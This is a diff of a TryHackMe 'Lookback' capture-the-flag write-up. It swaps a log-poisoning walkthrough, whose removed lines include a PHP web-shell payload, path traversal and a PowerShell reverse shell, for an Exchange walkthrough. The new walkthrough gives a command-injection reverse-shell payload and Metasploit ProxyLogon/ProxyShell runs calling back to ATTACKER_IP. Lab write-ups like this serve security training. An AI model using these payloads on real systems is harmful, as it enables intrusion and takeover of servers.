@@ -6,87 +6,126 @@
 | **Room** | [Lookback](https://tryhackme.com/room/lookback) |
 | **Difficulty** | 🟡 Medium |
 | **Category** | Web, Windows |
-| **OS** | Windows |
-| **Tools** | nmap, Burp Suite, curl |
+| **OS** | Windows (Microsoft Exchange / IIS) |
+| **Tools** | nmap, ffuf, Nikto, Metasploit, revshells.com |
 
 ---
 
 ## 🎯 Objective
 
-Exploit a log viewing application via log poisoning to achieve RCE and escalate privileges on a Windows machine.
+Compromise a Windows machine running Microsoft Exchange — find 3 flags by exploiting a command injection vulnerability and escalating via Exchange CVEs.
 
 ---
 
 ## 🔍 Reconnaissance
 
 ```bash
-nmap -sC -sV -oN nmap.txt TARGET_IP
+nmap -p- -Pn TARGET_IP -T5 -A
 ```
 
 **Open ports:**
 ```
-80/tcp   open  http    Microsoft IIS
-443/tcp  open  https   Microsoft IIS
-3389/tcp open  rdp
+80/tcp   open  http        Microsoft IIS 10.0
+443/tcp  open  https       Microsoft IIS 10.0
+3389/tcp open  ms-wbt-server (RDP)
 ```
 
-Web app allows viewing system logs through a parameter:
+Check the SSL certificate on port 443 — extract the hostname:
 ```
-http://TARGET_IP/test/log?file=access_log
+commonName=WIN-12OUO7A66M7
 ```
+
+Add to `/etc/hosts`:
+```bash
+echo "TARGET_IP WIN-12OUO7A66M7.thm.local" >> /etc/hosts
+```
+
+Navigate to `https://WIN-12OUO7A66M7.thm.local` — an Exchange login page appears.
 
 ---
 
-## 💥 Exploitation — Log Poisoning
+## 🌐 Web Enumeration
 
-The application displays log file contents. If we can write to the log and then include it — we achieve RCE.
-
-**Inject PHP/command in User-Agent:**
 ```bash
-curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://TARGET_IP/
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -u https://WIN-12OUO7A66M7.thm.local/FUZZ -fs 0
+
+# Found: /test
 ```
 
-**Include the poisoned log:**
-```
-http://TARGET_IP/test/log?file=../../../../../var/log/apache2/access_log&cmd=id
-```
+Navigate to `/test` — prompts for credentials. Run Nikto to find default creds:
 
-For Windows/IIS:
 ```bash
-# Inject into IIS logs via User-Agent
-curl -H "User-Agent: test" http://TARGET_IP/
-
-# Read log through LFI
-http://TARGET_IP/test/log?file=C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log
+nikto -host TARGET_IP
 ```
 
-Getting reverse shell:
-```bash
-# PowerShell reverse shell via cmd parameter
-http://TARGET_IP/?cmd=powershell+-e+BASE64_ENCODED_REVERSESHELL
-```
+Default credentials found — log in to `/test`.
 
 ---
 
-## 🔐 Privilege Escalation
+## 💥 Exploitation — Command Injection
+
+The `/test` page contains an input box. Test for command injection:
+
+```
+') | whoami ('
+# Returns: iis apppool\defaultapppool
+```
+
+Command injection confirmed. Generate a PowerShell reverse shell at **revshells.com** and trigger it:
+
+```
+') | powershell -e BASE64_ENCODED_SHELL ('
+```
+
+Shell received. Navigate to find flags:
 
 ```bash
-# Check privileges
-whoami /priv
-
-# SeImpersonatePrivilege — use PrintSpoofer or GodPotato
-.\PrintSpoofer.exe -i -c cmd
-# SYSTEM shell obtained
+# Flag 1 (service user flag) — in /test directory
+# Flag 2 (user flag) — check /dev/user.txt and /dev/TODO.txt
+type C:\dev\user.txt
+type C:\dev\TODO.txt
 ```
+
+`TODO.txt` reveals Microsoft Exchange is running.
+
+---
+
+## 🔐 Privilege Escalation — Exchange CVE via Metasploit
+
+```bash
+msfconsole
+
+search exchange
+# Use exchange ProxyLogon or ProxyShell exploit
+use exploit/windows/http/exchange_proxylogon_rce
+# or
+use exploit/windows/http/exchange_proxyshell_rce
+
+set RHOSTS WIN-12OUO7A66M7.thm.local
+set LHOST ATTACKER_IP
+set EMAIL admin@thm.local
+run
+```
+
+Meterpreter session opened — navigate to Administrator directory:
+
+```bash
+cd C:\Users\Administrator\Desktop
+type root.txt
+```
+
+**Flag 3 captured.**
 
 ---
 
 ## 📚 Lessons Learned
 
-- Log poisoning turns LFI into RCE — if you can write to a log and include it, you have code execution
-- Never expose log file paths via user-controlled parameters
-- SeImpersonatePrivilege on Windows service accounts is almost always exploitable for SYSTEM
-- Input sanitisation in the `User-Agent` header is frequently overlooked
+- Always check SSL certificates — they reveal hostnames that must be added to `/etc/hosts`
+- Nikto finds default credentials on web applications automatically
+- Command injection via log viewer inputs is a classic Windows web vulnerability
+- Microsoft Exchange has multiple critical CVEs (ProxyLogon, ProxyShell) — always check the version
+- `TODO.txt` and notes left by developers are valuable intel during post-exploitation
 
 ---
 *by OwlRC 🦉 | github.com/OwlRC*
